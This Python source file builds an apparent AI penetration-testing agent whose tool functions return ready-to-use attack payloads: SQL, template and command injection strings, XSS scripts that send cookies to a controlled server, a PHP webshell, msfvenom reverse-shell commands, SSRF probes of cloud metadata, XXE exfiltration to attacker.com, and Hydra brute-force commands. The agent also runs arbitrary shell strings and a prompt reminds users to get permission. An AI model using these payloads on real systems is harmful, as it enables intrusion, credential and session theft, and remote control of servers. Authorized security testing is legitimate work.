import sys
import os

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from dotenv import load_dotenv

load_dotenv()


import json
import subprocess
import re
import logging
from langchain_ollama import ChatOllama
from langchain_openai import ChatOpenAI
from langgraph.prebuilt import create_react_agent
from langchain_core.tools import Tool
from langchain_core.prompts import PromptTemplate
from utils.print_utils import pretty_print_messages
from services.model_loader import load_model

from langchain_community.tools import DuckDuckGoSearchResults


# --- Setup Logging ---
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

# --- Constants ---
MAX_TOOL_RETRIES = 3
DEFAULT_NMAP_FLAGS = "-p- -v -T5"
PATH_TO_WORDLIST = "~/wordlists"
# --- Core Utilities ---


def run_cli_command(
    command: str, timeout: int = 180
) -> str:  # Increased timeout for Nmap
    """
    Executes a shell command and returns its output or an error message.
    """
    try:
        logger.info(f"Executing CLI: {command}")
        process = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,  # Handle non-zero exit codes gracefully
        )
        if process.returncode == 0:
            # Some tools might print to stderr for informational messages,
            # but if returncode is 0, we primarily care about stdout.
            # However, nmap sometimes prints useful info to stderr even on success.
            # For simplicity now, we'll stick to stdout on success.
            # If a command specifically needs stderr too, this could be adjusted.
            return process.stdout.strip()
        else:
            # Combine stdout and stderr for more context on errors
            output = (process.stdout.strip() + "\n" + process.stderr.strip()).strip()
            # Nmap might return non-zero if e.g. host is down but -Pn is not used,
            # or other specific nmap errors.
            return f"Error (code {process.returncode}): {output}"
    except subprocess.TimeoutExpired:
        logger.error(f"Command timed out after {timeout}s: {command}")
        return f"Error: Command timed out after {timeout}s."
    except Exception as e:
        logger.error(f"Error executing command '{command}': {e}")
        return f"Error: Exception - {e}"


# --- Simplified Tool Functions ---
def searchsploit_tool(query: str) -> str:
    """
    Run searchsploit with a given query (e.g., CVE ID or keyword like 'Apache 2.4.50').
    This tool helps find known exploits from the Exploit-DB database.
    """
    logger.info(f"🔍 Running searchsploit for: {query}\n")
    try:
        # It's good practice to sanitize or validate the query if it's directly from user input,
        # but searchsploit itself is generally safe with varied string inputs.
        return run_cli_command(f"searchsploit {query}")
    except FileNotFoundError:
        return "❌ Error: searchsploit not found. Make sure it's installed and in your PATH."
    except Exception as e:
        logger.error(f"Error in searchsploit_tool: {e}")
        return f"❌ Error executing searchsploit: {e}"


def web_exploit_search_tool(search_term: str) -> str:
    """
    Searches the web using DuckDuckGo for exploits related to the search term.
    It prioritizes sites like Exploit-DB, GitHub, and NVD for more relevant results.
    Input should be a specific search query, e.g., 'CVE-2021-44228 exploit' or 'WordPress File Upload Vulnerability github'.
    """
    max_results = 5  # Number of results to fetch
    logger.info(f"Web searching for exploits: {search_term}")
    try:
        results = []
        # Refined query to be more specific to exploit hunting
        query = f"{search_term} exploit PoC site:exploit-db.com OR site:github.com OR site:nvd.nist.gov OR site:packetstormsecurity.com"
        with DuckDuckGoSearchResults(output_format="list") as ddgs:
            ddgs_results = ddgs.invoke(query, max_results=max_results)
            if ddgs_results:
                for r in ddgs_results:
                    title = r.get("title", "N/A")
                    href = r.get("link", "N/A")
                    results.append(f"- {title}: {href}")
        if results:
            return f"Web search results for '{search_term} exploit':\n" + "\n".join(
                results
            )
        else:
            return f"No relevant web search results found for '{search_term} exploit'. Try a more specific query."
    except ImportError:
        return "❌ Error: duckduckgo_search library not found. Please install it (`pip install -U duckduckgo-search`)."
    except Exception as e:
        logger.error(f"Error during web search: {e}")
        return f"❌ Error during web search: {e}. Check your internet connection and query."


def suggest_sqli_tool(target_info: str) -> str:
    """
    Suggests SQL injection payloads and SQLMap commands based on target_info (e.g., a URL, or a description of an input field).
    Provides guidance for manual testing and using SQLMap.
    """
    suggestions = f"SQL Injection (SQLi) Suggestions for '{target_info}':\n\n"
    suggestions += "1. Basic Payloads (try in URL parameters, form fields, HTTP headers like User-Agent, Referer):\n"
    basic_payloads = [
        "' OR '1'='1",
        "admin' OR '1'='1' --",
        "admin' OR '1'='1'#",
        "admin' OR '1'='1'/*",
        "' OR 1=1 -- -",
        "1' UNION SELECT NULL, @@version -- -",
        '" OR "1"="1',
        'admin" OR "1"="1" --',
        "') OR ('1'='1",
        "')) OR (('1'='1",
    ]
    for p in basic_payloads:
        suggestions += f"   - Payload: `{p}` (Look for changes in page content, errors, or successful login)\n"

    suggestions += "\n2. SQLMap (Automated SQL Injection Tool):\n"
    suggestions += "   - If you have a URL with parameters (e.g., http://example.com/search.php?id=1):\n"
    suggestions += '     `sqlmap -u "http://example.com/search.php?id=1" --batch --level=2 --risk=1 --dbs`\n'
    suggestions += "   - If testing POST requests or complex scenarios, capture the request with Burp Suite, save it to `request.req`:\n"
    suggestions += "     `sqlmap -r request.req --batch --level=2 --risk=1 --dbs`\n"
    suggestions += (
        "   - Replace `<target_url_with_params>` or `request.req` as appropriate.\n"
    )

    suggestions += "\nWhat to look for and report back:\n"
    suggestions += "  - Any SQL error messages displayed on the page.\n"
    suggestions += "  - Unexpected successful logins or access to data.\n"
    suggestions += "  - Output from SQLMap indicating a successful injection (e.g., list of databases, table names).\n"
    suggestions += "\nRemember to URL-encode payloads when testing in a browser's address bar if they contain special characters."
    return suggestions


def suggest_ssti_tool(target_info: str) -> str:
    """
    Suggests Server-Side Template Injection (SSTI) payloads for common template engines, based on target_info.
    Provides a list of payloads to help identify and confirm SSTI.
    """
    suggestions = (
        f"Server-Side Template Injection (SSTI) Suggestions for '{target_info}':\n\n"
    )
    suggestions += "Try these payloads in input fields, URL parameters, or anywhere user input might be rendered by a template engine on the server.\n"
    suggestions += "Look for the evaluated output of the arithmetic expressions (e.g., if `{{7*7}}` results in `49`).\n\n"

    ssti_payloads = {
        "Generic/Unknown (Polyglot)": [
            "${{7*7}}",
            "{{7*7}}",
            "<%= 7*7 %>",
            "#{7*7}",
            "@{7*7}",
            "*{7*7}",
        ],
        "Jinja2 (Python)": [
            "{{7*7}}",
            "{{config}}",
            "{{self}}",
            "{{''.__class__.__mro__[1].__subclasses__()[_some_index_].__init__.__globals__['os'].popen('id').read()}}",  # (More advanced, find _some_index_)
        ],
        "Freemarker (Java)": [
            "${7*7}",
            '<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}',
        ],
        "Velocity (Java)": [
            "#set($x=7*7)$x",
            "#set($x = $type.type('java.lang.Runtime').getRuntime().exec('id'))#set($x = $x.getInputStream())#set($str='')#foreach($i in [1..$x.available()])$str=$str.concat($type.type('java.lang.Character').toString($x.read()))#end $str",
        ],
        "Twig (PHP)": [
            "{{7*7}}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        ],
        "Smarty (PHP)": ["{7*7}", "{php}echo `id`;{/php}"],  # (If {php} tag is enabled)
        "Handlebars (JavaScript)": [
            '{{#with "s" as |string|}}{{#with "constructor" as |ctor|}}{{string[ctor].constructor(\'return process.mainModule.require("child_process").execSync("id")\')()}}{{/with}}{{/with}}'
        ],
        "ERB (Ruby)": ["<%= 7*7 %>", "<%= system('id') %>"],
    }

    for engine, payloads in ssti_payloads.items():
        suggestions += f"For {engine}:\n"
        for p in payloads:
            suggestions += f"  - Payload: `{p}`\n"
        suggestions += "\n"

    suggestions += "What to look for and report back:\n"
    suggestions += (
        "  - If any mathematical expressions are evaluated (e.g., 49 appears).\n"
    )
    suggestions += "  - If any sensitive information from server objects/configurations is displayed.\n"
    suggestions += "  - If you get command output (like from 'id' or 'whoami').\n"
    suggestions += (
        "  - Specific error messages that might reveal the template engine in use.\n"
    )
    return suggestions


def suggest_command_injection_tool(target_info: str) -> str:
    """
    Suggests command injection payloads for various operating systems, based on target_info.
    Helps test if user input is insecurely passed to system shell commands.
    """
    suggestions = f"Command Injection Suggestions for '{target_info}':\n\n"
    suggestions += "Try these payloads in input fields that might interact with the system shell (e.g., filenames, tool parameters, search queries that might be piped to grep).\n"
    suggestions += "Look for output from the injected commands or noticeable time delays if using sleep/ping.\n\n"

    # Common separators: ;, |, ||, &&, ``, $()
    # Common commands: id, whoami, ls, dir, uname -a, cat /etc/passwd, type C:\boot.ini, ping -c 3 127.0.0.1, timeout 5

    linux_payloads = [
        "; id",
        "| id",
        "&& id",
        "; ls -la /",
        "| ls -la /",
        "; uname -a",
        "; cat /etc/passwd",
        "$(id)",
        "`id`",
        "; ping -c 3 127.0.0.1",  # Time-based
    ]
    windows_payloads = [
        "& dir c:\\",
        "| dir c:\\",
        "&& dir c:\\",
        "& whoami",
        "| whoami",
        "& type C:\\Windows\\win.ini",
        "& ping -n 3 127.0.0.1",  # Time-based
    ]

    suggestions += "For Linux-like systems:\n"
    for p in linux_payloads:
        suggestions += f"  - Payload: `input_value{p}` (e.g., `filename.txt{p}`)\n"
    suggestions += "\n"

    suggestions += "For Windows systems:\n"
    for p in windows_payloads:
        suggestions += f"  - Payload: `input_value{p}` (e.g., `filename.txt{p}`)\n"
    suggestions += "\n"

    suggestions += "What to look for and report back:\n"
    suggestions += "  - Output of commands like `id`, `whoami`, `ls`, `dir` appearing in the HTTP response or on the page.\n"
    suggestions += "  - If using `ping` or `sleep`/`timeout`, observe if the HTTP response is delayed by the specified amount of time.\n"
    suggestions += (
        "  - Error messages that might indicate a command was partially executed.\n"
    )
    return suggestions


def suggest_xss_tool(target_info: str) -> str:
    """
    Suggests common Cross-Site Scripting (XSS) payloads based on target_info.
    Aids in testing for reflected, stored, and DOM-based XSS vulnerabilities.
    """
    suggestions = f"Cross-Site Scripting (XSS) Suggestions for '{target_info}':\n\n"
    suggestions += "Try injecting these payloads into input fields, URL parameters, or anywhere user input is reflected on the page.\n"
    suggestions += "Check if the scripts execute in your browser (e.g., an alert box appears, or content is modified).\n\n"

    payloads = [
        # Basic
        "<script>alert('XSS')</script>",
        "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",  # External script
        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",  # img tag based
        "<svg/onload=alert('XSS')>",  # svg tag based
        "<body onload=alert('XSS')>",  # body tag, less likely but possible in some contexts
        # Attribute-based
        "\" autofocus onfocus=alert('XSS') x=\"",  # Injecting into an HTML attribute
        "' autofocus onfocus=alert('XSS') x='",
        # Event Handlers
        "<img src=\"javascript:alert('XSS');\">",
        "<a href=\"javascript:alert('XSS')\">Click me</a>",
        # Polyglots (try to work in more contexts)
        'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/-/" ώěst pāşš="">alert(1)</script>',
        # Cookie Stealing (use a controlled server like Burp Collaborator or a simple netcat listener)
        "<script>document.location='http://YOUR_CONTROLLED_SERVER.com/cookiesteal?cookie='+document.cookie</script>",
        "<script>new Image().src='http://YOUR_CONTROLLED_SERVER.com/cookiesteal?c='+document.cookie;</script>",
    ]

    suggestions += "Common Payloads:\n"
    for p in payloads:
        suggestions += f"  - Payload: `{p}`\n"
    suggestions += "\n"
    suggestions += "From your diagram:\n"
    suggestions += '  - Payload: `<img src="123" onerror="alert(\'test\')" />`\n'
    suggestions += "  - Payload: `<script>fetch('http://<web_url>/steal?cookie=' + btoa(document.cookie))</script>` (Replace `<web_url>` with your listener)\n"

    suggestions += "What to look for and report back:\n"
    suggestions += (
        "  - If an alert box with 'XSS' (or similar) pops up in your browser.\n"
    )
    suggestions += "  - If using cookie stealing payloads, check if your listener server receives a request with cookie data.\n"
    suggestions += "  - Any unexpected JavaScript errors in the browser console that might indicate partial execution or filtering.\n"
    suggestions += "  - How the input is reflected in the page source (e.g., is it inside an HTML tag, an attribute, a JavaScript block?).\n"
    suggestions += "\nRemember to test in different contexts if your input is reflected in multiple places."
    return suggestions


def suggest_file_upload_tool(target_info: str) -> str:
    """
    Suggests techniques to bypass file upload restrictions and payloads for testing file upload vulnerabilities, based on target_info.
    Focuses on getting a webshell or malicious script executed on the server.
    """
    suggestions = f"File Upload Vulnerability Suggestions for '{target_info}':\n\n"
    suggestions += "If the application has a file upload feature, attempt to upload a webshell (e.g., a simple PHP script that executes commands).\n\n"

    suggestions += "1. Webshell Examples:\n"
    suggestions += "   - Simple PHP webshell (`shell.php`): `<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }?>`\n"
    suggestions += "     (Access via: `http://target.com/uploads/shell.php?cmd=id`)\n"
    suggestions += "   - More comprehensive webshells: Search GitHub for 'PHP webshell', 'ASPX webshell', etc.\n\n"

    suggestions += (
        "2. Bypass Techniques (try these if direct upload of `shell.php` is blocked):\n"
    )
    suggestions += "   - Change Extension: `shell.php5`, `shell.phtml`, `shell.php.rar` (if server misconfigured to execute .php within .rar), `shell.jpg.php` (less common).\n"
    suggestions += "   - Case Sensitivity: `shell.PhP`, `shell.pHp`.\n"
    suggestions += "   - Double Extensions: `shell.php.jpg` (hoping it's processed as PHP despite the final .jpg).\n"
    suggestions += "   - Null Byte Injection (mostly legacy): `shell.php%00.jpg` or `shell.php\x00.jpg`.\n"
    suggestions += "   - Change MIME Type: Use Burp Suite to intercept the upload request. Change `Content-Type` from (e.g.) `image/jpeg` to `application/x-httpd-php` or `text/php`, while keeping a seemingly benign extension like `.jpg` or using the target extension like `.php`.\n"
    suggestions += "   - Add Magic Numbers/Bytes: Prepend legitimate magic bytes of an allowed file type (e.g., `GIF89a;`) to your webshell content, but save with a `.php` extension.\n"
    suggestions += "   - Malicious Payloads in Allowed File Types: For image uploads, try crafting polyglot files or use tools that embed payloads in image metadata (less about RCE, more about XSS or other issues if metadata is displayed).\n\n"

    suggestions += "3. Payload Generation (e.g., for reverse shells using msfvenom - replace LHOST, LPORT):\n"
    suggestions += "   - PHP: `msfvenom -p php/meterpreter_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f raw > revshell.php`\n"
    suggestions += "   - ASPX: `msfvenom -p windows/meterpreter_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f aspx > revshell.aspx`\n"
    suggestions += "   - JSP: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f raw > revshell.jsp`\n"
    suggestions += "   - Also check `revshells.com` for quick payload generation.\n\n"

    suggestions += "What to look for and report back:\n"
    suggestions += "  - If the file uploads successfully.\n"
    suggestions += "  - The URL/path where the uploaded file can be accessed.\n"
    suggestions += "  - If accessing the uploaded file executes your webshell or reverse shell (e.g., you get a command prompt, a connection back to your listener).\n"
    suggestions += (
        "  - Any error messages during upload or when trying to access the file.\n"
    )
    return suggestions


def suggest_idor_tool(target_info: str) -> str:
    """
    Guides the user on how to look for Insecure Direct Object References (IDOR) based on target_info.
    IDORs occur when the application uses user-supplied input to access objects directly.
    """
    suggestions = (
        f"Insecure Direct Object Reference (IDOR) Suggestions for '{target_info}':\n\n"
    )
    suggestions += "IDORs occur when an application uses user-supplied input to access objects (e.g., records, files) directly without proper authorization checks.\n\n"
    suggestions += "1. Identify Potential Points:\n"
    suggestions += "   - Look for parameters in URLs, POST data, JSON requests, or HTTP headers that seem to be identifiers:\n"
    suggestions += "     e.g., `id=123`, `user_id=456`, `file_name=document.pdf`, `account_id=789`.\n"
    suggestions += "   - These can be numeric, GUIDs, or even predictable strings.\n\n"

    suggestions += "2. Testing Steps:\n"
    suggestions += "   - **Substitute Identifiers**: If you are user A with `id=100` accessing `/profile?id=100`, try changing it to `id=101` (another user's potential ID). Do the same for other users if you have multiple accounts for testing.\n"
    suggestions += "   - **Numeric IDs**: Increment/decrement IDs (`id=100` -> `id=99`, `id=101`).\n"
    suggestions += "   - **GUIDs**: Harder to predict, but sometimes other users' GUIDs are leaked elsewhere in the application (e.g., in API responses, JavaScript variables, HTML comments).\n"
    suggestions += "   - **Different Endpoints**: If `/api/users/{userID}/orders` is one endpoint, check if you can access `/api/users/{anotherUserID}/orders`.\n"
    suggestions += "   - **HTTP Method Tampering**: If an object is accessed via a GET request (e.g., `GET /api/documents/123`), try accessing it with POST, PUT, or DELETE with the same ID to see if you can modify/delete objects you shouldn't.\n"
    suggestions += '   - **Parameter Tampering**: If a request to update your profile is `POST /my/profile { "email":"my@em.ail" }`, try adding an `id` parameter: `POST /my/profile { "id":"other_user_id", "email":"my@em.ail" }`.\n\n'

    suggestions += "What to look for and report back:\n"
    suggestions += "  - If you can access data (view, modify, delete) belonging to another user or that you shouldn't have access to.\n"
    suggestions += "  - The specific URL, parameters, and values you changed that led to unauthorized access.\n"
    suggestions += "  - Any differences in responses (e.g., a 200 OK for an unauthorized ID vs. a 403 Forbidden or 404 Not Found for a non-existent one).\n"
    return suggestions


def suggest_ssrf_tool(target_info: str) -> str:
    """
    Guides the user on how to test for Server-Side Request Forgery (SSRF) based on target_info.
    SSRF allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.
    """
    suggestions = (
        f"Server-Side Request Forgery (SSRF) Suggestions for '{target_info}':\n\n"
    )
    suggestions += "SSRF occurs when an attacker can make the server application send requests to unintended locations (internal or external).\n\n"
    suggestions += "1. Identify Potential Points:\n"
    suggestions += "   - Look for any functionality where the application fetches a resource based on a user-supplied URL or part of a URL.\n"
    suggestions += "     e.g., `?image_url=http://example.com/img.jpg`, `?webhook=http://...`, `?url=...`, `?feed_url=...`.\n"
    suggestions += "   - Check XML-based requests if XXE is also a possibility, as XXE can lead to SSRF.\n\n"

    suggestions += "2. Testing Payloads and Techniques:\n"
    suggestions += "   - **Internal Network Probing (use an external callback service like Burp Collaborator, interact.sh, or requestbin.com to confirm):**\n"
    suggestions += "     - `http://127.0.0.1` (localhost)\n"
    suggestions += "     - `http://localhost:PORT` (try common internal ports like 80, 8080, 443, 22, 3306, 5432, 6379, 9200, etc.)\n"
    suggestions += "     - `http://169.254.169.254/latest/meta-data/` (AWS/Cloud metadata endpoint - VERY SENSITIVE)\n"
    suggestions += (
        "     - `http://metadata.google.internal/computeMetadata/v1/` (GCP metadata)\n"
    )
    suggestions += "     - `http://[::1]` (IPv6 localhost)\n"
    suggestions += "   - **Different Protocols (if allowed by the parser):**\n"
    suggestions += "     - `file:///etc/passwd` or `file:///c:/windows/win.ini` (to read local files)\n"
    suggestions += "     - `gopher://<your_server_ip>:<port>/_` (can craft requests to various services, e.g., Redis, MySQL)\n"
    suggestions += "     - `dict://<your_server_ip>:<port>/info`\n"
    suggestions += "   - **Bypass Filters/WAFs:**\n"
    suggestions += "     - Use alternate IP encodings: `http://0x7f000001` (127.0.0.1), `http://2130706433` (decimal for 127.0.0.1)\n"
    suggestions += "     - Use DNS records you control that resolve to internal IPs.\n"
    suggestions += "     - URL encoding tricks: `http://127.0.0.1%23@example.com` (part after # might be ignored by server but not by filter).\n"
    suggestions += "     - Try redirectors (e.g. a URL shortener that redirects to an internal IP, or your own server that issues a 302 redirect).\n\n"

    suggestions += "What to look for and report back:\n"
    suggestions += (
        "  - If your callback server receives HTTP requests from the target server.\n"
    )
    suggestions += "  - If the application's response contains data from internal services or local files (e.g., content of `/etc/passwd`, error messages from internal ports).\n"
    suggestions += "  - Differences in response times or error messages that indicate an internal request was attempted (e.g., connection refused vs. DNS resolution error).\n"
    return suggestions


def suggest_xxe_tool(target_info: str) -> str:
    """
    Guides the user on how to test for XML External Entity (XXE) vulnerabilities based on target_info.
    XXE attacks abuse XML parsers that process external entities in XML documents.
    """
    suggestions = f"XML External Entity (XXE) Suggestions for '{target_info}':\n\n"
    suggestions += "XXE occurs when an application parses XML input from an untrusted source and allows the inclusion of external entities.\n\n"
    suggestions += "1. Identify Potential Points:\n"
    suggestions += "   - Any endpoint that accepts XML data (check `Content-Type: application/xml` or `text/xml`).\n"
    suggestions += "   - File uploads that process XML files (e.g., DOCX, XLSX, SVG if server-side parsing occurs).\n\n"

    suggestions += "2. Basic XXE to Retrieve Local Files (In-Band):\n"
    suggestions += (
        "   - Payload example (try to fetch `/etc/passwd` or `C:\\boot.ini`):\n"
    )
    suggestions += "     ```xml\n"
    suggestions += '     <?xml version="1.0" encoding="UTF-8"?>\n'
    suggestions += "     <!DOCTYPE foo [\n"
    suggestions += '       <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
    suggestions += "     ]>\n"
    suggestions += "     <data><value>&xxe;</value></data>\n"
    suggestions += "     ```\n"
    suggestions += "     (Adapt `<data><value>` to match the application's expected XML structure.)\n\n"

    suggestions += "3. Error-Based XXE (if direct output isn't shown but errors are):\n"
    suggestions += (
        "   - Payload example (loads a non-existent file via a parameter entity):\n"
    )
    suggestions += "     ```xml\n"
    suggestions += '     <?xml version="1.0" encoding="UTF-8"?>\n'
    suggestions += "     <!DOCTYPE foo [\n"
    suggestions += '       <!ENTITY % file SYSTEM "file:///etc/passwd">\n'
    suggestions += "       <!ENTITY % eval \"<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>\">\n"
    suggestions += "       %eval;\n"
    suggestions += "     ]>\n"
    suggestions += "     <data></data>\n"
    suggestions += "     ```\n"
    suggestions += (
        "     (Look for error messages containing content from `/etc/passwd`.)\n\n"
    )

    suggestions += "4. Blind XXE / Out-of-Band (OOB) Data Exfiltration (using an external DTD on a server you control - e.g., `http://attacker.com/evil.dtd`):\n"
    suggestions += "   - Main XML Payload:\n"
    suggestions += "     ```xml\n"
    suggestions += '     <?xml version="1.0" encoding="UTF-8"?>\n'
    suggestions += "     <!DOCTYPE foo [\n"
    suggestions += '       <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">\n'
    suggestions += "       %xxe;\n"
    suggestions += "     ]>\n"
    suggestions += "     <data></data>\n"
    suggestions += "     ```\n"
    suggestions += "   - Content of `evil.dtd` on `http://attacker.com/evil.dtd`:\n"
    suggestions += "     ```dtd\n"
    suggestions += '     <!ENTITY % file SYSTEM "file:///etc/passwd">\n'
    suggestions += "     <!ENTITY % send \"<!ENTITY % exfil SYSTEM 'http://attacker.com/?content=%file;'>\">\n"
    suggestions += "     %send;\n"
    suggestions += "     ```\n"
    suggestions += "     (Check your server logs at `attacker.com` for requests containing file content.)\n\n"

    suggestions += "5. XXE for SSRF:\n"
    suggestions += "   - Use an external entity to make the server request an internal or external URL.\n"
    suggestions += "     ```xml\n"
    suggestions += '     <?xml version="1.0"?>\n'
    suggestions += '     <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service.local/admin">]>\n'
    suggestions += "     <foo>&xxe;</foo>\n"
    suggestions += "     ```\n\n"

    suggestions += "What to look for and report back:\n"
    suggestions += "  - If file contents (e.g., from `/etc/passwd`) are returned in the HTTP response.\n"
    suggestions += "  - If error messages contain parts of sensitive files.\n"
    suggestions += "  - If your external server (for OOB XXE) receives HTTP requests containing exfiltrated data or just connection attempts.\n"
    suggestions += "  - If the application behaves differently, indicating an SSRF attempt via XXE was successful.\n"
    return suggestions


def suggest_low_hanging_fruit_tool(target_info: str) -> str:
    """
    Suggests checks for common low-hanging fruit vulnerabilities based on target_info.
    Includes default credentials, weak passwords, and potential for brute-forcing.
    """
    suggestions = f"Low-Hanging Fruit Suggestions for '{target_info}':\n\n"
    suggestions += "These are common, often easily exploitable vulnerabilities.\n\n"

    suggestions += "1. Default Credentials:\n"
    suggestions += "   - Identify software/services running on the target (e.g., Jenkins, Tomcat, phpMyAdmin, routers, IoT devices).\n"
    suggestions += "   - Search online for default credentials for that specific software/version (e.g., 'default jenkins admin password', 'tomcat default manager credentials').\n"
    suggestions += "   - Try common combinations: `admin:admin`, `admin:password`, `root:root`, `test:test`, `guest:guest`.\n\n"

    suggestions += "2. Weak Passwords:\n"
    suggestions += "   - If login forms are found, manually try a small list of very common weak passwords against common usernames (admin, administrator, root, user, service_account_name).\n"
    suggestions += "   - Examples: `password`, `123456`, `qwerty`, `Password123!`, `<CompanyName>123`.\n\n"

    suggestions += "3. Brute Force (Use with EXTREME CAUTION and only with explicit permission!):\n"
    suggestions += "   - **Identify Targets**: Login pages (web), SSH, FTP, RDP, database logins.\n"
    suggestions += (
        "   - **Tools**: `Hydra`, `Ncrack`, `Metasploit auxiliary modules`.\n"
    )
    suggestions += "   - **Wordlists**: Small, common password lists first (e.g., top 100 passwords). `SecLists` (on GitHub) is a great resource for larger lists.\n"
    suggestions += "   - **Example (Hydra for HTTP Basic Auth login on a web server - replace details):**\n"
    suggestions += "     `hydra -l admin -P /usr/share/wordlists/rockyou_top1000.txt <target_ip_or_hostname> http-get /login_path`\n"
    suggestions += "   - **Example (Hydra for SSH):**\n"
    suggestions += "     `hydra -l root -P passwords.txt <target_ip> ssh`\n"
    suggestions += "   - **Important Considerations**: \n"
    suggestions += "     - Account lockout policies (too many failed attempts might lock accounts).\n"
    suggestions += (
        "     - Network impact (aggressive scanning can be noisy or disruptive).\n"
    )
    suggestions += "     - Legal and ethical implications. ALWAYS have permission.\n\n"

    suggestions += "4. Information Disclosure / Sensitive Files Exposed:\n"
    suggestions += "   - Look for `.git` directories, `config.php.bak`, `web.config.old`, `robots.txt` (for disallowed paths that might be interesting), sitemap.xml.\n"
    suggestions += "   - Google Dorking: `site:target.com filetype:log`, `site:target.com intitle:index.of`, `site:target.com ext:sql OR ext:bkf OR ext:bak`.\n\n"

    suggestions += (
        "5. Software Versioning & Known Public Exploits (Re-iterate from CVE search):\n"
    )
    suggestions += "   - Ensure you've thoroughly checked versions of all identified software (web server, OS, applications, libraries) against `searchsploit` or `CVE databases`.\n\n"

    suggestions += "What to look for and report back:\n"
    suggestions += "  - Any successful logins using default or weak credentials.\n"
    suggestions += "  - Results of brute-force attempts (successful credentials, number of attempts before lockout if observed).\n"
    suggestions += "  - Sensitive files or directories found.\n"
    suggestions += "  - Any information that could lead to further exploitation (e.g., internal paths, usernames, configurations).\n"
    return suggestions


use_openai = "OPENAI_API_KEY" in os.environ and bool(os.environ["OPENAI_API_KEY"])
model = load_model(use_openai=False)

AGENT_PROMPT_TEMPLATE = """
You are a specialized AI Penetration Testing Assistant. Your role is to help users find and understand security vulnerabilities in their target systems.

**IMPORTANT:** Only test systems you have explicit written permission for.

**AVAILABLE TOOLS:**
- `searchsploit_tool`: Search Exploit-DB for known exploits
- `web_exploit_search_tool`: Search web for additional CVEs and PoCs
- 'suggest_<vuln_type>_tool': Suggest specific recommendations for common vulnerabilities

**WORKFLOW:**
1. Get target information:
   - Target URL/IP
   - Technology stack
   - Permission confirmation

2. Search for vulnerabilities:
   - Use searchsploit_tool to find known exploits
   - Use web_exploit_search_tool to find additional CVEs
   - Analyze results and provide actionable advice

3. Guide next steps:
   - Suggest specific recommendations based on findings ( Can be done by using tools start with 'suggest_' and choose the appropriate tool based on the target information)
   - Provide commands and techniques to try
   - Help interpret results
"""
# Previous conversation history:
# {messages}

prompt = PromptTemplate.from_template(AGENT_PROMPT_TEMPLATE)

vuln_disc_and_exploit_agent = create_react_agent(
    model=model,
    tools=[searchsploit_tool, web_exploit_search_tool, suggest_sqli_tool, suggest_ssti_tool, suggest_command_injection_tool, suggest_xss_tool, suggest_file_upload_tool, suggest_idor_tool, suggest_ssrf_tool, suggest_xxe_tool, suggest_low_hanging_fruit_tool],
    prompt=prompt,
    name="Vulnerability Discovery and Exploit Agent",
)

# --- Example Usage ---
if __name__ == "__main__":
    # Example target (replace with your own)
    # target = "http://ffuf.me" # Initial target can be set or asked

    # Initialize message history
    message_history = []

    print("Vulnerability Discovery and Exploit Agent")
    print("Type 'exit' or 'quit' to end the session.")
    print("--------------------------------------------")

    initial_prompt = input("What is the target system or URL you are testing? (And please confirm you have permission): ")
    if initial_prompt.lower() in ["exit", "quit"]:
        print("Exiting.")
        exit()

    message_history.append({"role": "user", "content": initial_prompt})

    while True:
        print("\n--- Agent Response ---")
        full_response = ""
        for chunk in vuln_disc_and_exploit_agent.stream({"messages": message_history}):
           pretty_print_messages(chunk)


        print() # Newline after agent's full response

        if full_response: # Add agent's full response to history
             message_history.append({"role": "assistant", "content": full_response})


        user_input = input("\nYour response: ")
        if user_input.lower() in ["exit", "quit"]:
            print("Exiting.")
            break

        message_history.append({"role": "user", "content": user_input})
